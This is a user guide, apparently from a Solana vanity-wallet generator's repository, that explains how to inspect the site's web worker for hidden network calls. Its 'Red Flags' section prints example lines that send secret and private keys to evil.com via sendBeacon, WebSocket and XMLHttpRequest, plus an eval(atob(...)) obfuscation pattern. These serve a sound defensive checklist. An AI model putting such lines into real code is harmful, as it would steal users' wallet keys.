# Source Code Inspection Guide

This guide shows you how to view and verify the actual production code running on vwg.rip.

---

## ✅ What You'll Verify

- The code snippets in this repo match production
- Critical security lines are unchanged
- No hidden malicious code exists

---

## 🛠️ Method 1: View Source in Browser

### Step 1: View the Worker File

Open this URL directly in your browser:
```
https://vwg.rip/vanity-worker.js
```

Or use view-source:
```
view-source:https://vwg.rip/vanity-worker.js
```

You'll see the complete worker source code.

---

### Step 2: Find the Critical Security Line

Press `Ctrl+F` (or `Cmd+F` on Mac) and search for:

```javascript
const keypair = Keypair.generate();
```

**Expected Location**: Around line 78

**What to verify**:
- This line exists
- It's inside the main generation loop
- No network calls appear before or after it

---

### Step 3: Verify No Network Calls

Search the file (Ctrl+F) for these terms:

| Search Term | Expected Result |
|-------------|-----------------|
| `fetch(` | ❌ Not found |
| `XMLHttpRequest` | ❌ Not found |
| `axios` | ❌ Not found |
| `.ajax` | ❌ Not found |
| `navigator.sendBeacon` | ❌ Not found |
| `WebSocket` | ❌ Not found |

If ANY of these are found, that's a **red flag** 🚩

---

### Step 4: Verify the postMessage Line

Search for:
```javascript
secretKey: Array.from(keypair.secretKey)
```

**Expected Location**: Around line 93

**What this means**:
- The private key is sent via `postMessage()` to the main browser thread
- **Still in your browser** - not to a server
- Used only to display to YOU

---

### Step 5: Compare with Repository Snippets

Open the code snippet from this repo:
```
code-snippets/wallet-generation.md
```

**Verify**:
- Line 78 in production matches our snippet
- Line 93 in production matches our snippet
- No additional network code has been added

---

## 🛠️ Method 2: Download and Hash

For extra security, you can verify the file hasn't changed.

### Step 1: Download the Worker File

```bash
# Using curl:
curl https://vwg.rip/vanity-worker.js -o vanity-worker.js

# Or using wget:
wget https://vwg.rip/vanity-worker.js
```

---

### Step 2: Calculate SHA256 Hash

**Windows (PowerShell)**:
```powershell
Get-FileHash vanity-worker.js -Algorithm SHA256
```

**Mac/Linux**:
```bash
shasum -a 256 vanity-worker.js
```

**Expected Output** (as of 2025-11-30):
```
[Hash will be published once code is stable]
```

**What to do**:
1. Compare your hash with the published hash (above)
2. If they match → File is unchanged ✅
3. If different → Code has been modified 🚩

**Note**: Hash will change if ANY character changes (even comments). Check the changelog to see if updates were announced.

---

## 🛠️ Method 3: Browser DevTools Source Viewer

### Step 1: Open DevTools

1. Go to `https://vwg.rip`
2. Press `F12` (or `Cmd+Option+I` on Mac)
3. Go to **Sources** tab

---

### Step 2: Find the Worker File

**Chrome/Edge/Brave**:
1. Look for `vanity-worker.js` in the file tree (left sidebar)
2. Might be under:
   - `top` → `vwg.rip` → `vanity-worker.js`
   - Or in a `Workers` section

**Firefox**:
1. Click the `{}` icon (Debugger)
2. Look for `vanity-worker.js` in sources list

---

### Step 3: Read the Code

You can now:
- Read the entire file line-by-line
- Set breakpoints (click line numbers)
- Step through execution (if you want to see it run)

**What to look for**:
- Line 78: `const keypair = Keypair.generate();`
- No `fetch()`, `XMLHttpRequest`, or network calls
- Matches the snippets in this repository

---

## 🛠️ Method 4: Use Browser Extensions

### Option A: Download All Resources

1. Install extension like "Save All Resources" or "SingleFile"
2. Save the entire page including scripts
3. Inspect files locally

### Option B: HTTP Archive (HAR)

1. DevTools → Network tab
2. Right-click → "Save all as HAR with content"
3. Open `.har` file in text editor
4. Search for `vanity-worker.js` content
5. Verify no sensitive data in responses

---

## 🔍 What to Look For (Security Checklist)

When inspecting the code, verify:

### ✅ Good Signs:

```javascript
// ✅ Using official Solana library
importScripts('https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/...');

// ✅ Standard keypair generation
const keypair = Keypair.generate();

// ✅ postMessage to main thread (browser only)
self.postMessage({
  type: 'found',
  result: { publicKey: ..., secretKey: ... }
});

// ✅ No network imports
// No axios, no fetch, no XMLHttpRequest
```

### 🚩 Red Flags (should NOT exist):

```javascript
// ❌ External server communication
fetch('https://some-server.com/api/keys', { ... })

// ❌ Data exfiltration
navigator.sendBeacon('https://evil.com', secretKey)

// ❌ Obfuscated code
eval(atob('c29tZV9vYmZ1c2NhdGVk...'))

// ❌ Hidden network calls
new XMLHttpRequest().send(privateKey)

// ❌ WebSocket connections
new WebSocket('wss://evil.com').send(...)
```

---

## 📊 Compare Line-by-Line

Use this checklist to compare production with repository snippets:

| Line # | Repository Snippet | Production Code | Match? |
|--------|-------------------|-----------------|--------|
| ~13 | `importScripts('https://cdn.jsdelivr.net/...')` | | [ ] |
| ~78 | `const keypair = Keypair.generate();` | | [ ] |
| ~88-98 | `self.postMessage({ type: 'found', ... })` | | [ ] |
| Any | `fetch(` calls | Should be NONE | [ ] |
| Any | `XMLHttpRequest` | Should be NONE | [ ] |

---

## 🛡️ Advanced: Verify Library Integrity

The worker loads `@solana/web3.js` from JSDelivr CDN. You can verify this too:

### Step 1: Check Subresource Integrity (SRI)

Look at the main page source:
```html
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
```

**Best practice**: Should include `integrity` attribute:
```html
<script
  src="..."
  integrity="sha384-..."
  crossorigin="anonymous">
</script>
```

If missing, you can still verify manually (next step).

---

### Step 2: Verify the Solana Library Itself

1. Visit: `https://www.jsdelivr.com/package/npm/@solana/web3.js?version=1.95.8`
2. Check file size and hash
3. Compare with official Solana release

**Official Source**:
```
https://github.com/solana-labs/solana-web3.js
```

The version should match a tagged release on GitHub.

---

## ❓ FAQ

### Q: How often should I verify the code?

**A**:
- Before generating your first wallet (initial trust)
- After any site updates (if announced)
- Periodically if you're paranoid (monthly is reasonable)

You can monitor this repository for changes - we'll update hashes when code changes.

### Q: What if line numbers don't match exactly?

**A**: Minor shifts (±5 lines) are normal due to:
- Comments added
- Code formatting changes
- Non-security updates

**Focus on**:
1. The critical security lines still exist
2. No new network calls were added
3. The overall logic is unchanged

### Q: Can I diff the file with the repository version?

**A**: Yes! Advanced users can:
```bash
# Download production file
curl https://vwg.rip/vanity-worker.js -o prod-worker.js

# Compare with expected (if we published full file)
diff prod-worker.js expected-worker.js

# Or use a GUI diff tool
code --diff prod-worker.js expected-worker.js
```

**Note**: We don't publish the full file (proprietary), only snippets. But you can compare snippets manually.

---

## 🎯 Summary Checklist

After inspecting the source code:

- [ ] Found `const keypair = Keypair.generate();` around line 78
- [ ] Found `secretKey: Array.from(keypair.secretKey)` in postMessage
- [ ] Searched for `fetch(` - NOT FOUND
- [ ] Searched for `XMLHttpRequest` - NOT FOUND
- [ ] Verified no obfuscated code (no eval, no atob)
- [ ] Production code matches repository snippets
- [ ] (Optional) File hash matches published hash

**If all verified, the code is legitimate.** ✅

---

**Next Steps**:
- [DevTools Check Guide](./devtools-check.md) - Monitor network traffic
- [Network Analysis Guide](./network-analysis.md) - Deep packet inspection (advanced)
